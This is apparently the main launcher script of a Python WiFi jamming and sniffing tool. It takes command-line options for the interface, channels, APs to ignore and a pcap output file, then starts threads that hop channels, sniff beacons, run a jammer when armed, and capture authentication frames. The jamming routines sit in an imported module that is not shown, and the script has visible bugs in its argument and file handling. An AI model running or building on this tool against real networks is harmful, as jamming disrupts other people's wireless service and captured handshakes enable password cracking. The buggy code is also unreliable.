#!/bin/python3
import argparse
import threading
from Functions import *

global AP_list
AP_list = []

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

parser.add_argument('interface', action='store', help='Sets the interface to use for sending and receiving')

group.add_argument('-l', '--ignore-list', dest='list', action='store', type=list, help='Ignore APs given by command line input (each MAC separated by spaces)')
group.add_argument('-f', '--ignore-file', dest='file', action='store', type=str, help='Ignore APs from this file (each MAC separated by newlines)')

parser.add_argument('-o', '--output', dest='output', action='store', type=str, help='File to write captured Auth Frames to (will only jam if not set)')
parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Enable verbose logging', default=False)
parser.add_argument('-c', '--channel', dest='channels', action='store', type=list, help='Channels to hop on (default is 1-11)', default=[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11])
parser.add_argument('-a', '--arm', dest='arm', action='store_true', help='Arm the WiFi jammer (will simply sniff beacons if not armed)', default=False)

args = parser.parse_args()

if args.verbose == True:
	def verboseOutput(status, output, *details):
		if status == 1:
			statement = "\t[*] "
		elif status == 0:
			statement = "\t[ ] "
		elif status == 2:
			statement = "\t\t"
		statement += output
		if details:
			for x in details:
				statement += "\n\t\t\t" + x
		print(statement)

if args.list:
	ignore_AP = args.list
elif args.file:
	with open(args.file, 'r') as file:
		ignore_AP = [file.readlines()]

if args.output:
	output = PcapWriter(args.output, append=True)

channelHopper = threading.Thread(target = channelHop, args=(args.interface, args.channels))
beaconSniffer = threading.Thread(target = sniff, kwargs = dict(prn=packetHandler, iface=args.interface))
jammer = threading.Thread(target = jammer)

channelHopper.start()
beaconSniffer.start()
if args.arm == True:
	jammer.start()